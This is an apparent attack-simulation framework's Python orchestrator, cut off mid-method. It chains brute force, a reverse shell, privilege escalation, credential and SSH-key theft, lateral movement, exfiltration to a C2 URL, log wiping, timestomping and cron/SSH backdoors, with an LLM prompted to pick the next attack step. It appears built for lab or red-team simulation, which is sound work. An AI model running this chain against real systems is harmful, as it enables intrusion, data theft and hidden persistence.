#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Mon Aug  3 00:30:38 2026

@author: hounsousamuel
"""

"""
InteractiveWebOrchestrator – version web de InteractiveTerminalOrchestrator.

Adapte le mode interactif terminal pour fonctionner via WebSocket :
  - Remplace les _ask_*()    → params dict envoyé par le client WS
  - Remplace les console.*() → ws_send() coroutine vers le client WS
  - Garde la même logique métier, les mêmes imports, les mêmes instances de classes
  - Maintient le même état inter-steps : scan_data, cred_data, exec_data, ca_data...

Merge keep/replace/add contrôlé par des champs *_mode dans les params.
"""

import asyncio
import os
import sys
sys.path.insert(1, os.path.dirname(os.path.abspath(os.path.join(__file__, "..", ".."))))

from datetime import datetime, timezone
from typing import Any, Callable, Dict, List, Optional, Set
from copy import deepcopy
from simulateur_attaque_ia.orchestrator.auto_orchestrator import DEFAULT_INPUT_DICT, SIMULATOR_STATE_KEYS
from simulateur_attaque_ia.tactics.reconnaissance.port_scan_and_banner_grab import NetworkServiceDiscover
from simulateur_attaque_ia.tactics.initial_access import FTPBruteForce, HTTPBruteForce, SSHBruteForce
from simulateur_attaque_ia.tactics.execution.command_execution import CommandExecution
from simulateur_attaque_ia.tactics.execution.reverse_shell import ReverseShell
from simulateur_attaque_ia.tactics.persistence.ssh_key_backdoor import SSHKeyBackdoor
from simulateur_attaque_ia.tactics.persistence.cron_backdoor import CronBackdoor
from simulateur_attaque_ia.tactics.privilege_escalation import SudoExploit, SUIDBinary
from simulateur_attaque_ia.tactics.credential_access import PasswordFileDump, BashHistoryRead, SSHKeyTheft
from simulateur_attaque_ia.tactics.lateral_movement import SSHLateralMovement
from simulateur_attaque_ia.tactics.exfiltration import ExfiltrationHTTP
from simulateur_attaque_ia.tactics.defense_evasion import LogCleaner, Timestomp
from simulateur_attaque_ia.orchestrator.prompts import build_prompt_decision, build_prompt_review
from simulateur_attaque_ia.orchestrator.actions import ALL_ACTIONS, ACTIONS_MAPPING
from simulateur_attaque_ia.simulateur_utils.utils import silence_output
from simulateur_attaque_ia.simulateur_utils.logger import get_logger
from simulateur_attaque_ia.orchestrator.managers.utils import _sim_config_to_flat
logger = get_logger()


# ─────────────────────────────────────────────────────────────────────────────
# Helper : merge de listes (keep / replace / add)
# ─────────────────────────────────────────────────────────────────────────────

def _merge(existing: List, incoming: Optional[List], mode: str) -> List:
    """
    Fusionne deux listes comme le fait le terminal interactif :
      keep    → ignore incoming, retourne existing
      replace → retourne incoming (ou existing si incoming absent)
      add     → union dédupliquée existing + incoming
    """
    if incoming is None:
        return existing
    mode = (mode or "replace").lower()
    if mode == "keep":
        return existing
    if mode == "add":
        merged = list(existing)
        for v in incoming:
            if v not in merged:
                merged.append(v)
        return merged
    return list(incoming)   # replace


# ─────────────────────────────────────────────────────────────────────────────
# InteractiveWebOrchestrator
# ─────────────────────────────────────────────────────────────────────────────

class InteractiveWebOrchestrator:
    """
    Orchestre une simulation interactive en mode web (via WebSocket).

    Chaque step est déclenché par un message WS du client :
        { type: "execute_action", action: "reconnaissance", params: {...} }

    L'état est maintenu entre les steps (comme dans run_interactive du terminal) :
        self.scan_data   → résultat de reconnaissance
        self.cred_data   → résultat de initial_access
        self.exec_data   → résultat de execution (contient selected_cred)
        self.ca_data     → résultat de credential_access (usable_keys, known_hosts...)
    """

    def __init__(
        self,
        docker_manager: Any,
        ip: str,
        sim_config: Any = None,
        use_llm: bool = False,
        llm: Any = None,
        ws_send: Callable = None,
    ) -> None:
        self.docker_manager = docker_manager
        self.ip = ip
        self.use_llm = use_llm
        self.llm = llm
        self._ws_send = self.build_callback(ws_send)

        # Config flat (mêmes clés que DEFAULT_INPUT_DICT / SimulatorState)
        self.conf: Dict[str, Any] = deepcopy(DEFAULT_INPUT_DICT)
        self._started_at = datetime.now(tz=timezone.utc).isoformat()
        self.conf["ip"] = ip

        if sim_config:
            try:
                self.conf.update(
                    {k: v for k, v in _sim_config_to_flat(sim_config).items() if k in SIMULATOR_STATE_KEYS}
                )
            except Exception:
                pass

        # État inter-steps — même structure que le terminal
        self.scan_data:    Dict = {}
        self.cred_data:    Dict = {}
        self.exec_data:    Dict = {}
        self.privesc_data: Dict = {}
        self.ca_data:      Dict = {}
        self.lateral_data: Dict = {}

        # Résultats accumulés (même format que final_result du terminal)
        self.steps_results: Dict[str, List] = {}
        self.done_steps:    Set[str] = set()
        self.logs = []
        
    def build_callback(self, ws_send: Callable | None):
        send_func = lambda msg: asyncio.sleep(0)
        if ws_send and callable(ws_send):
            send_func = ws_send
            
        async def _ws_send(msg):
            self.logs.append(msg)
            r = send_func(msg)
            if asyncio.iscoroutine(r):
                await r
        
        return _ws_send
    
    # ── Config helpers ────────────────────────────────────────────────────────

    def _get(self, key: str, default: Any = None) -> Any:
        return self.conf.get(key, default)

    def _set(self, key: str, value: Any) -> None:
        self.conf[key] = value

    # ── WS emit ───────────────────────────────────────────────────────────────

    async def _emit(self, msg: dict) -> None:
        try:
            msg.setdefault("timestamp", datetime.now().isoformat())
            result = self._ws_send(msg)
            if asyncio.iscoroutine(result):
                await result
        except Exception as exc:
            logger.warning(f"ws_send error: {exc}")

    async def _emit_progress(self, step: str, message: str, data: Any = None) -> None:
        msg = {"type": "step_progress", "step": step, "message": message}
        msg["data"] = data
        await self._emit(msg)

    # ── Dispatcher ────────────────────────────────────────────────────────────

    async def execute_step(self, action: str, params: Dict[str, Any]) -> Dict[str, Any]:
        """
        Point d'entrée unique appelé par le WS handler.
        Dispatche vers la bonne méthode selon le nom du step.
        """
        action = action.lower()
        if action == "finish":
            return {"success": True, "result": {}, "error": None}
        # ─── 1. Vérification des prérequis ──────────────────────────────────
        available = self.available_actions()
        if action not in available:
            # L'action n'est pas disponible → on explique pourquoi
            details = self.available_actions_with_details()  # version détaillée
            reason = details.get(action, {}).get("reason", "non disponible")
            
            await self._emit({
                "type": "step_error",
                "step": action,
                "error": f"Action '{action}' non disponible : {reason}",
                "actions_available": available,
                "actions_details": details,
                "error_type": "unavailable_action"
            })
            return {
                "success": False,
                "error": f"Action non disponible : {reason}",
                "actions_available": available,
                "error_type": "unavailable_action",
                "actions_details": details,
            }
        
        # ─── 2. Mapping des handlers ────────────────────────────────────────
        mapping = {
            "reconnaissance":       self._step_reconnaissance,
            "initial_access":       self._step_initial_access,
            "execution":            self._step_execution,
            "persistence":          self._step_persistence,
            "privilege_escalation": self._step_privilege_escalation,
            "credential_access":    self._step_credential_access,
            "lateral_movement":     self._step_lateral_movement,
            "exfiltration":         self._step_exfiltration,
            "defense_evasion":      self._step_defense_evasion,
            "report":               self._step_report,
        }
        
        handler = mapping.get(action)
        if handler is None:
            error_msg = f"Action inconnue : '{action}'. Disponibles : {list(mapping.keys())}"
            await self._emit({
                "type": "step_error",
                "step": action,
                "error": error_msg,
            })
            return {"success": False, "error": error_msg}
        
        # ─── 3. Exécution ────────────────────────────────────────────────────
        try:
            await self._emit({
                "type": "step_start",
                "step": action,
                "message": f"Démarrage : {action}",
                "params": params,
            })
            get_logger().remove(True)
            # with silence_output() as (out, err):
            result = await handler(params)
            self.done_steps.add(action)
            get_logger().setup(
                logger.logger.getEffectiveLevel(),
                logger.structured
            )
            details = self.available_actions_with_details()  # version détaillée
            await self._emit({
                "type": "step_success",
                "step": action,
                "message": f"✅ {action} terminé avec succès",
                "result": result,
                "actions_available": self.available_actions(),
                "actions_details": details,
                "actions_done": list(self.done_steps),
            })
            
            return {
                "success": True,
                "step": action,
                "result": result,
                "actions_available": self.available_actions(),
                "actions_details": details,
                "actions_done": list(self.done_steps),
            }
            
        except ValueError as e:
            # ─── Erreur métier (prérequis manquant, paramètre invalide) ────
            error_msg = str(e)
            import traceback
            trace = traceback.format_exc()
            
            await self._emit({
                "type": "step_error",
                "step": action,
                "error": error_msg,
                "error_type": "prereq_error",
                "trace": trace,
                "actions_available": self.available_actions(),
            })
            return {
                "success": False,
                "step": action,
                "error": error_msg,
                "error_type": "prereq_error",
                "trace": trace,
                "actions_available": self.available_actions(),
            }
            
        except asyncio.CancelledError:
            # ─── Annulation par l'utilisateur ──────────────────────────────
            await self._emit({
                "type": "step_cancelled",
                "step": action,
                "message": f"⏹️ {action} annulé",
                "trace": "",
            })
            return {
                "success": False,
                "step": action,
                "error": "Action annulée",
                "error_type": "cancelled",
                "trace": "",
            }
            
        except Exception as e:
            # ─── Erreur inattendue ──────────────────────────────────────────
            import traceback
            error_msg = str(e)
            trace = traceback.format_exc()
            
            await self._emit({
                "type": "step_error",
                "step": action,
                "error": f"Erreur inattendue : {error_msg}",
                "traceback": trace,
                "error_type": "unexpected",
            })
            
            # Log l'erreur complète
            logger.error(f"[execute_step] Erreur sur {action}: {error_msg}\n{trace}")
            
            return {
                "success": False,
                "step": action,
                "error": error_msg,
                "error_type": "unexpected",
                "traceback": trace,
            }
        
    # ─────────────────────────────────────────────────────────────────────────
    # ── STEPS — même logique que le terminal, params au lieu de _ask_*() ─────
    # ─────────────────────────────────────────────────────────────────────────

    async def _step_reconnaissance(self, params: Dict) -> Dict:
        """
        params acceptés :
          timeout_socket   float
          port_range       List[int]
          port_range_mode  "keep" | "replace" | "add"   (défaut: replace)
        """
        timeout_socket = params.get(
            "timeout_socket",
            self._get("network_discover_timeout_socket", 0.2)
        )
        port_range = _merge(
            existing=list(self._get("network_discover_port_range", [22, 80, 443, 8080])),
            incoming=params.get("port_range"),
            mode=params.get("port_range_mode", "replace"),
        )
        self._set("network_discover_timeout_socket", timeout_socket)
        self._set("network_discover_port_range", port_range)

        await self._emit_progress(
            "reconnaissance",
            f"Scan de {self.ip} sur {len(port_range)} port(s)…",
            {"port_range": port_range}
        )

        n_discover = NetworkServiceDiscover(timeout_socket=timeout_socket)
        with silence_output():
            n_result = await n_discover.scan_async(self.ip, port_range=port_range)

        open_ports  = n_result["results"]["open_ports"]
        scan_result = n_result["results"]["scan_result"]
        port_function = {
            func: [p for p in open_ports
                   if func in scan_result.get(p, {}).get("service", "").lower()]
            for func in ["ssh", "ftp", "http"]
        }

        self.steps_results.setdefault("NetworkServiceDiscover|Reconnaissance", []).append(
            {"result": n_result, "port": None, "ip": self.ip}
        )

        self.scan_data = {
            "open_ports":    open_ports,
            "scan_result":   scan_result,
            "port_function": port_function,
            "continue":      bool(open_ports),
        }
        return self.scan_data

    async def _step_initial_access(self, params: Dict) -> Dict:
        """
        params acceptés :
          timeout       float
          delay         float
          max_attempts  int
          add_common    bool
          ssh: {
            enabled        bool
            total_timeout  float | null
            usernames      List[str]
            usernames_mode "keep"|"replace"|"add"
            passwords      List[str]
            passwords_mode "keep"|"replace"|"add"
            ports          List[int]   # sous-ensemble de port_function["ssh"]
          }
          ftp: { même structure }
          http: {
            enabled        bool
            preference     "http://"|"https://"
            paths          List[str]
            paths_mode     "keep"|"replace"|"add"
            ports          List[int]
          }
        """
        if not self.scan_data:
            raise ValueError("Lancez d'abord la Reconnaissance.")

        open_ports    = self.scan_data["open_ports"]
        port_function = self.scan_data["port_function"]

        timeout    = params.get("timeout",      self._get("initial_access_timeout", 5.0))
        delay      = params.get("delay",        self._get("initial_access_delay", 0.2))
        max_att    = params.get("max_attempts", self._get("initial_access_max_attempts", 50))
        add_common = params.get("add_common",   self._get("initial_access_add_common", True))

        all_creds: Dict[str, Dict] = {}
        services_map = {"ssh": SSHBruteForce, "ftp": FTPBruteForce, "http": HTTPBruteForce}

        for function, default_ports in port_function.items():
            svc_params = params.get(function, {}) or {}
            if not svc_params.get("enabled", True):
                continue
            if not default_ports:
                continue

            ports_to_test = svc_params.get("ports") or default_ports

            await self._emit_progress(
                "initial_access",
                f"Bruteforce {function.upper()} sur {ports_to_test}…"
            )

            all_creds[function] = {}

            if function in ("ssh", "ftp"):
                key_u = f"{function}_brute_force_usernames"
                key_p = f"{function}_brute_force_passwords"

                usernames = _merge(
                    self._get(key_u, []),
                    svc_params.get("usernames"),
                    svc_params.get("usernames_mode", "keep"),
                )
                passwords = _merge(
                    self._get(key_p, []),
                    svc_params.get("passwords"),
                    svc_params.get("passwords_mode", "keep"),
                )
                self._set(key_u, usernames)
                self._set(key_p, passwords)

                total_timeout = svc_params.get("total_timeout")  # None = illimité

                for port in ports_to_test:
                    classe = services_map[function](
                        total_timeout=total_timeout,
                        timeout=timeout,
                        delay=delay,
                        max_attempts=max_att,
                    )
                    with silence_output():
                        result = await classe.find_all_async(
                            ip=self.ip,
                            port=port,
                            add_common=add_common,
                            usernames=usernames,
                            passwords=passwords,
                        )
                    all_creds[function][port] = result
                    key = f"{function.title()}BruteForce|InitialAccess"
                    self.steps_results.setdefault(key, []).append(
                        {"result": result, "port": port, "ip": self.ip}
                    )

            elif function == "http":
                existing_pref = self._get("http_brute_force_preference", "http://")
                preference = svc_params.get("preference", existing_pref)
                self._set("http_brute_force_preference", preference)

                paths = _merge(
                    self._get("http_brute_force_paths", []),
                    svc_params.get("paths"),
                    svc_params.get("paths_mode", "keep"),
                )
                paths = ["/" + p.strip("/") for p in paths]
                self._set("http_brute_force_paths", paths)

                for port in ports_to_test:
                    classe = services_map["http"](timeout=timeout, preference=preference)
                    with silence_output():
                        result = await classe.find_all_async(
                            url=self.ip,
                            port=port,
                            add_common=add_common,
                            paths=paths,
                        )
                    all_creds[function][port] = result
                    self.steps_results.setdefault("HTTPBruteForce|InitialAccess", []).append(
                        {"result": result, "port": port, "ip": self.ip}
                    )

        self.cred_data = {"credentials": all_creds, "continue": bool(all_creds)}
        return self.cred_data

    async def _step_execution(self, params: Dict) -> Dict:
        """
        params acceptés :
          credential_index  int    (index dans la liste SSH creds, défaut 0)
          timeout           float
          exec_timeout      float
          add_common        bool
          quick             bool
          commands          List[str]
          commands_mode     "keep"|"replace"|"add"
          run_reverse_shell bool
          reverse_shell: {
            attaquant_ip, attaquant_port, timeout, exec_timeout,
            listener_timeout, total_timeout, commands, commands_mode
          }
        """
        if not self.cred_data.get("credentials"):
            raise ValueError("Lancez d'abord l'Initial Access.")

        # Extraire les creds SSH du cred_data
        ssh_creds: List[Dict] = []
        for port, result in self.cred_data["credentials"].get("ssh", {}).items():
            for cred in result.get("results", {}).get("founds", []):
                ssh_creds.append({"port": port, **cred})

        if not ssh_creds:
            self.exec_data = {"continue": False, "error": "Aucun credential SSH trouvé."}
            return self.exec_data

        idx = params.get("credential_index", 0)
        if idx >= len(ssh_creds):
            idx = 0
        cred = ssh_creds[idx]

        port     = int(cred["port"])
        username = cred["username"]
        password = cred["password"]

        timeout      = params.get("timeout",      self._get("command_execution_timeout", 2.0))
        exec_timeout = params.get("exec_timeout", self._get("command_execution_exec_timeout", 10.0))
        add_common   = params.get("add_common",   True)
        quick        = params.get("quick",        True)

        commands = _merge(
            self._get("command_execution_commands", []),
            params.get("commands"),
            params.get("commands_mode", "keep"),
        )

        await self._emit_progress(
            "execution",
            f"Exécution commandes sur {self.ip}:{port} ({username})…",
            {"ssh_creds_available": [
                {"index": i, "username": c["username"], "port": c["port"]}
                for i, c in enumerate(ssh_creds)
            ]}
        )

        with silence_output():
            cmd_exec = CommandExecution(timeout=timeout, exec_timeout=exec_timeout)
            cmd_result = await cmd_exec.exec_command_async(
                ip=self.ip,
                port=port,
                username=username,
                password=password,
                commands=commands,
                add_common=add_common,
                quick=quick,
            )
        self.steps_results.setdefault("CommandExecution|Execution", []).append(
            {"result": cmd_result, "port": port, "ip": self.ip}
        )

        # Reverse shell optionnel
        rs_result = {}
        if params.get("run_reverse_shell") and params.get("reverse_shell"):
            rs_p = params["reverse_shell"]
            att_ip      = rs_p.get("attaquant_ip",      self._get("reverse_shell_attaquant_ip", "172.17.0.1"))
            att_port    = rs_p.get("attaquant_port",    self._get("reverse_shell_attaquant_port", 4444))
            rs_timeout  = rs_p.get("timeout",           self._get("reverse_shell_timeout", 2.0))
            rs_exec     = rs_p.get("exec_timeout",      self._get("reverse_shell_exec_timeout", 30.0))
            rs_listener = rs_p.get("listener_timeout",  self._get("reverse_shell_listener_timeout", 15.0))
            rs_total    = rs_p.get("total_timeout",     self._get("reverse_shell_total_timeout", 60.0))
            rs_commands = _merge(
                self._get("reverse_shell_commands", ["whoami", "id", "hostname"]),
                rs_p.get("commands"),
                rs_p.get("commands_mode", "keep"),
            )
            await self._emit_progress("execution", "Reverse shell en cours…")
            with silence_output():
                rs = ReverseShell(timeout=rs_timeout, exec_timeout=rs_exec)
                rs_result = await rs.reverse_async(
                    ip=self.ip,
                    port=port,
                    attaquant_ip=att_ip,
                    attaquant_port=att_port,
                    username=username,
                    password=password,
                    commands=rs_commands,
                    timeout=rs_listener,
                    total_timeout=rs_total,
                )
            self.steps_results.setdefault("ReverseShell|Execution", []).append(
                {"result": rs_result, "port": port, "ip": self.ip}
            )

        self.exec_data = {
            "ssh_creds":     ssh_creds,
            "selected_cred": cred,
            "cmd_result":    cmd_result,
            "rs_result":     rs_result,
            "continue":      True,
        }
        return self.exec_data

    async def _step_privilege_escalation(self, params: Dict) -> Dict:
        """
        params acceptés :
          timeout       float
          exec_timeout  float
          run_sudo      bool  (défaut True)
          run_suid      bool  (défaut True)
        """
        if not self.exec_data.get("selected_cred"):
            raise ValueError("Lancez d'abord l'Execution.")

        cred     = self.exec_data["selected_cred"]
        port     = int(cred["port"])
        username = cred["username"]
        password = cred["password"]

        timeout      = params.get("timeout",      self._get("privilege_escalation_timeout", 2.0))
        exec_timeout = params.get("exec_timeout", self._get("privilege_escalation_exec_timeout", 10.0))
        run_sudo     = params.get("run_sudo", True)
        run_suid     = params.get("run_suid", True)

        sudo_result, suid_result = {}, {}

        if run_sudo:
            await self._emit_progress("privilege_escalation", "Sudo exploit…")
            with silence_output():
                sudo = SudoExploit(timeout=timeout, exec_timeout=exec_timeout)
                sudo_result = await sudo.exploit_async(
                    ip=self.ip, port=port, username=username, password=password
                )
            self.steps_results.setdefault("SudoExploit|PrivilegeEscalation", []).append(
                {"result": sudo_result, "port": port, "ip": self.ip}
            )

        if run_suid:
            await self._emit_progress("privilege_escalation", "SUID binary scan…")
            with silence_output():
                suid = SUIDBinary(timeout=timeout, exec_timeout=exec_timeout)
                suid_result = await suid.exploit_async(
                    ip=self.ip, port=port, username=username, password=password
                )
            self.steps_results.setdefault("SUIDBinary|PrivilegeEscalation", []).append(
                {"result": suid_result, "port": port, "ip": self.ip}
            )

        privesc_success = (
            sudo_result.get("results", {}).get("success_number", 0) > 0 or
            suid_result.get("results", {}).get("success_number", 0) > 0
        )

        self.privesc_data = {
            "selected_cred":   cred,
            "privesc_success": privesc_success,
            "sudo_result":     sudo_result,
            "suid_result":     suid_result,
            "continue":        True,
        }
        # Propager selected_cred dans exec_data comme le terminal
        self.exec_data["selected_cred"] = self.privesc_data.get("selected_cred", cred)
        return self.privesc_data

    async def _step_credential_access(self, params: Dict) -> Dict:
        """
        params acceptés :
          timeout       float
          exec_timeout  float
          run_dump      bool  (défaut True)
          run_history   bool  (défaut True)
          run_keys      bool  (défaut True)
        """
        if not self.exec_data.get("selected_cred"):
            raise ValueError("Lancez d'abord l'Execution.")

        cred     = self.exec_data["selected_cred"]
        port     = int(cred["port"])
        username = cred["username"]
        password = cred["password"]

        timeout      = params.get("timeout",      self._get("credential_access_timeout", 2.0))
        exec_timeout = params.get("exec_timeout", self._get("credential_access_exec_timeout", 10.0))
        run_dump     = params.get("run_dump",    True)
        run_history  = params.get("run_history", True)
        run_keys     = params.get("run_keys",    True)

        await self._emit_progress("credential_access", "Extraction credentials…")

        coros = []
        if run_dump:
            coros.append(("dump", PasswordFileDump(
                timeout=timeout, exec_timeout=exec_timeout
            ).dump_async(ip=self.ip, port=port, username=username, password=password)))
        if run_history:
            coros.append(("read", BashHistoryRead(
                timeout=timeout, exec_timeout=exec_timeout
            ).read_async(ip=self.ip, port=port, username=username, password=password)))
        if run_keys:
            coros.append(("steal", SSHKeyTheft(
                timeout=timeout, exec_timeout=exec_timeout
            ).steal_async(ip=self.ip, port=port, username=username, password=password)))

        dump_result, read_result, steal_result = {}, {}, {}

        if coros:
            with silence_output():
                results = await asyncio.gather(
                    *[c for _, c in coros], return_exceptions=True
                )
            for (name, _), result in zip(coros, results):
                if isinstance(result, Exception):
                    continue
                if name == "dump":
                    dump_result = result
                    self.steps_results.setdefault("PasswordFileDump|CredentialAccess", []).append(
                        {"result": result, "port": port, "ip": self.ip}
                    )
                elif name == "read":
                    read_result = result
                    self.steps_results.setdefault("BashHistoryRead|CredentialAccess", []).append(
                        {"result": result, "port": port, "ip": self.ip}
                    )
                elif name == "steal":
                    steal_result = result
                    self.steps_results.setdefault("SSHKeyTheft|CredentialAccess", []).append(
                        {"result": result, "port": port, "ip": self.ip}
                    )

        usable_keys = steal_result.get("results", {}).get("usable_keys", [])
        known_hosts = steal_result.get("results", {}).get("known_hosts", [])

        self.ca_data = {
            "selected_cred": cred,
            "dump_result":   dump_result,
            "read_result":   read_result,
            "steal_result":  steal_result,
            "usable_keys":   usable_keys,
            "known_hosts":   known_hosts,
            "continue":      True,
        }
        return self.ca_data

    async def _step_lateral_movement(self, params: Dict) -> Dict:
        """
        params acceptés :
          max_depth    int
          max_workers  int
          join_timeout float
        """
        if not self.ca_data.get("usable_keys") or not self.ca_data.get("known_hosts"):
            raise ValueError(
                "Lateral movement impossible : pas de clés SSH ou de hosts connus. "
                "Lancez d'abord Credential Access."
            )

        usable_keys = self.ca_data["usable_keys"]
        known_hosts  = self.ca_data["known_hosts"]

        max_depth    = params.get("max_depth",    self._get("lateral_movement_max_depth", 3))
        max_workers  = params.get("max_workers",  self._get("lateral_movement_max_workers", 5))
        join_timeout = params.get("join_timeout", self._get("lateral_movement_join_timeout", 60.0))

        await self._emit_progress(
            "lateral_movement",
            f"Propagation BFS — {len(usable_keys)} clé(s) × {len(known_hosts)} host(s)…"
        )

        with silence_output():
            lateral = SSHLateralMovement(
                timeout=self._get("credential_access_timeout", 2),
                exec_timeout=self._get("credential_access_exec_timeout", 10),
                max_depth=max_depth,
                max_workers=max_workers,
                join_timeout=join_timeout,
            )
            result = await lateral.propagate_async(
                usable_keys=usable_keys,
                known_hosts=known_hosts,
            )

        self.steps_results.setdefault("SSHLateralMovement|LateralMovement", []).append(
            {"result": result, "ip": self.ip}
        )

        self.lateral_data = {
            "sessions":       result.get("results", {}).get("compromised_hosts", {}),
            "lateral_result": result,
            "continue":       True,
        }
        return self.lateral_data

    async def _step_exfiltration(self, params: Dict) -> Dict:
        """
        params acceptés :
          c2_url   str
          timeout  int
        """
        if not self.ca_data:
            raise ValueError("Lancez d'abord Credential Access.")

        c2_url  = params.get("c2_url",  self._get("exfiltration_c2_url", "http://127.0.0.1:8888/exfil"))
        timeout = params.get("timeout", self._get("exfiltration_timeout", 10))
        self._set("exfiltration_c2_url", c2_url)

        tactic_results = {}
        if self.ca_data.get("dump_result"):
            tactic_results["password_file_dump"] = self.ca_data["dump_result"]
        if self.ca_data.get("read_result"):
            tactic_results["bash_history_read"]  = self.ca_data["read_result"]
        if self.ca_data.get("steal_result"):
            tactic_results["ssh_key_theft"]      = self.ca_data["steal_result"]

        await self._emit_progress("exfiltration", f"Exfiltration vers {c2_url}…")

        with silence_output():
            exfil  = ExfiltrationHTTP(c2_url=c2_url, timeout=int(timeout))
            result = await exfil.exfil_async(
                target_ip=self.ip,
                tactic_results=tactic_results,
            )

        self.steps_results.setdefault("ExfiltrationHTTP|Exfiltration", []).append(
            {"result": result, "ip": self.ip}
        )

        return {"exfil_result": result, "continue": True}

    async def _step_defense_evasion(self, params: Dict) -> Dict:
        """
        params acceptés :
          timeout       float
          exec_timeout  float
          run_clean     bool  (défaut True)
          run_stomp     bool  (défaut True)
        """
        if not self.exec_data.get("selected_cred"):
            raise ValueError("Lancez d'abord l'Execution.")

        cred     = self.exec_data["selected_cred"]
        port     = int(cred["port"])
        username = cred["username"]
        password = cred["password"]

        timeout      = params.get("timeout",      self._get("defense_evasion_timeout", 2.0))
        exec_timeout = params.get("exec_timeout", self._get("defense_evasion_exec_timeout", 10.0))
        run_clean    = params.get("run_clean", True)
        run_stomp    = params.get("run_stomp", True)

        clean_result, stomp_results = {}, []
        created_files = self._get("created_files", [])

        if run_clean:
            await self._emit_progress("defense_evasion", "Nettoyage des logs…")
            with silence_output():
                cleaner = LogCleaner(timeout=timeout, exec_timeout=exec_timeout)
                clean_result = await cleaner.clean_async(
                    ip=self.ip, port=port, username=username, password=password
                )
            self.steps_results.setdefault("LogCleaner|DefenseEvasion", []).append(
                {"result": clean_result, "port": port, "ip": self.ip}
            )

        if run_stomp and created_files:
            await self._emit_progress("defense_evasion", "Timestomp des fichiers créés…")
            with silence_output():
                timestomp = Timestomp(timeout=timeout, exec_timeout=exec_timeout)
                stomp_tasks = [
                    timestomp.timestomp_to_another_file(
                        ip=self.ip, port=port,
                        username=username, password=password,
                        source="/bin/bash",
                        target=f,
                    )
                    for f in created_files
                ]
                stomp_results = await asyncio.gather(*stomp_tasks, return_exceptions=True)
            self.steps_results.setdefault("Timestomp|DefenseEvasion", []).append(
                {"result": {"files": created_files}, "port": port, "ip": self.ip}
            )

        return {"clean_result": clean_result, "stomp_results": len(stomp_results), "continue": True}

    async def _step_persistence(self, params: Dict) -> Dict:
        """
        params acceptés :
          run_ssh_key          bool  (défaut True)
          ssh_key_algo         str   "Ed25519"|"RSA"|"ECDSA"
          ssh_key_timeout      float
          ssh_key_exec_timeout float
          run_cron             bool  (défaut True)
          cron_script_path     str
          cron_expression      str
          cron_level           str   "simple"|"advanced"
        """
        if not self.exec_data.get("selected_cred"):
            raise ValueError("Lancez d'abord l'Execution.")

        cred     = self.exec_data["selected_cred"]
        port     = int(cred["port"])
        username = cred["username"]
        password = cred["password"]

        installed: List[str] = []

        # ── SSH Key Backdoor ──────────────────────────────────────────────────
        if params.get("run_ssh_key", True):
            algo         = params.get("ssh_key_algo",         self._get("ssh_key_algo", "Ed25519"))
            timeout      = params.get("ssh_key_timeout",      self._get("ssh_key_timeout", 2.0))
            exec_timeout = params.get("ssh_key_exec_timeout", self._get("ssh_key_exec_timeout", 5.0))

            await self._emit_progress("persistence", "Injection clé SSH…")
            with silence_output():
                ssh_key = SSHKeyBackdoor(timeout=timeout, exec_timeout=exec_timeout)
                key_result = await ssh_key.inject_key_async(
                    ip=self.ip, port=port,
                    username=username, password=password,
                    algo=algo,
                )
            if key_result.get("results", {}).get("success"):
                installed.append("ssh_key")
            self.steps_results.setdefault("SshKeyBackdoor|Persistence", []).append(
                {"result": key_result, "port": port, "ip": self.ip}
            )

        # ── Cron Backdoor ─────────────────────────────────────────────────────
        if params.get("run_cron", True) and self.docker_manager:
            script_path = params.get("cron_script_path", self._get("cron_script_path", "/opt/backdoor.sh"))
            cron_expr   = params.get("cron_expression",  self._get("cron_expression", "*/1 * * * *"))
            level       = params.get("cron_level",       self._get("cron_level", "simple"))

            self._set("created_files", [script_path])
            self._set("cron_script_path", script_path)
            self._set("cron_expression",  cron_expr)

            await self._emit_progress("persistence", "Cron backdoor…")
            # CronBackdoor.cron_inject est synchrone → to_thread
            cron = CronBackdoor()
            cron_result = await asyncio.to_thread(
                cron.cron_inject,
                self.docker_manager,
                script_path,
                cron_expr,
                level,
            )
            if cron_result.get("results", {}).get("inject", {}).get("success"):
                installed.append("cron")
            self.steps_results.setdefault("CronBackdoor|Persistence", []).append(
                {"result": cron_result, "port": "docker", "ip": self.ip}
            )

        return {"installed": installed, "continue": True}

    async def _step_report(self, params: Dict) -> Dict:
        return self.build_report()

    # ─────────────────────────────────────────────────────────────────────────
    # LLM — Suggestion & Review (même API que le terminal)
    # ─────────────────────────────────────────────────────────────────────────

    async def llm_suggest(self) -> str:
        if not self.use_llm or not self.llm:
            return "Assistant indisponible"
        prompt = build_prompt_decision(self.steps_results, self.conf)
        system = (
            "Tu es un expert en attaque cyber. Analyse l'état et décide de la "
            "prochaine action. Réponds UNIQUEMENT par le nom de l'action.\n"
        )
        try:
            response = await self.llm.call(
                system=system, prompt=prompt, max_tokens=50, temperature=0.0
            )
            if response.get("success"):
                action = response.get("response", "").strip().lower().replace("_", "")
                for a in ALL_ACTIONS:
                    if action in a.strip().lower().replace("_", ""):
                        return ACTIONS_MAPPING[a]
            return ""
        except Exception as exc:
            return f"Erreur LLM : {exc}"

    async def llm_review(self, user_action: str) -> str:
        if not self.use_llm or not self.llm:
            return "Assistant indisponible"
        prompt = build_prompt_review(self.steps_results, self.conf, user_action)
        system = "Tu es un expert en attaque cyber. Donne un avis concis et utile."
        try:
            response = await self.llm.call(
                system=system, prompt=prompt, max_tokens=1000, temperature=0.7
            )
            default = "Je n'ai pas d'avis sur cette action."
            return response.get("response", default).strip() if response.get("success") else default
        except Exception as exc:
            return f"Erreur LLM : {str(exc)}"

    # ─────────────────────────────────────────────────────────────────────────
    # Rapport & état courant
    # ─────────────────────────────────────────────────────────────────────────
    
    @staticmethod
    def build_empty_report():
        return {
            "ip":          None,
            "started_at":  datetime.now(tz=timezone.utc).isoformat(),
            "ended_at":    datetime.now(tz=timezone.utc).isoformat(),
            "done_steps":  [],
            "steps_results": {},
            "logs":         []
        }
    
    def build_report(self) -> Dict[str, Any]:
        from copy import deepcopy
        return {
            "ip":          self.ip,
            "started_at":  self._started_at,
            "ended_at":    datetime.now(tz=timezone.utc).isoformat(),
            "done_steps":  list(self.done_steps),
            "steps_results": self.steps_results,
            "logs":         deepcopy(self.logs)
        }
    
    # ── Helpers de statut (méthodes d'instance) ──────────────────────────────
    
    def _has_ssh_creds(self) -> bool:
        """Vérifie qu'il y a des credentials SSH valides."""
        if not self.cred_data or not self.cred_data.get("credentials"):
            return False
        ssh_creds = self.cred_data["credentials"].get("ssh", {})
        return any(
            creds.get("results", {}).get("founds")
            for creds in ssh_creds.values()
        )
    
    def _has_selected_cred(self) -> bool:
        """Vérifie qu'on a sélectionné un credential SSH."""
